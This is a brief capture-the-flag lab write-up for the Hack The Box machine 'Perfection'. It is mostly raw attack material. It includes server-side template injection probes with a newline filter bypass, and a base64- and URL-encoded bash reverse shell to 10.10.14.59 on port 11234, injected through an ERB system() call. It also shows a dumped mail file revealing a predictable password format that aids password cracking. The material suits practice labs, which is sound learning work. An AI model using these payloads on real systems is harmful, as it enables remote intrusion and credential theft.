# HTB-Perfection

7 * 7

%0A<%25%3d+7*7+%25>

``` shell
base64 <<< "bash -i >& /dev/tcp/10.10.14.59/11234 0>&1" | sed 's/\+/\%2b/'
```


``` urlencode

test <%=system("echo+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41OS8xMTIzNCAwPiYxCg==+|+base64+-d+|+bash");%>

test%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC41OS8xMTIzNCAwPiYxCg==+|+base64+-d+|+bash");%25>
```

``` 
susan@perfection:/$ cat /var/mail/susan
susan@perfection:/$ cat /var/mail/susan

Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
susan@perfection:/$ 
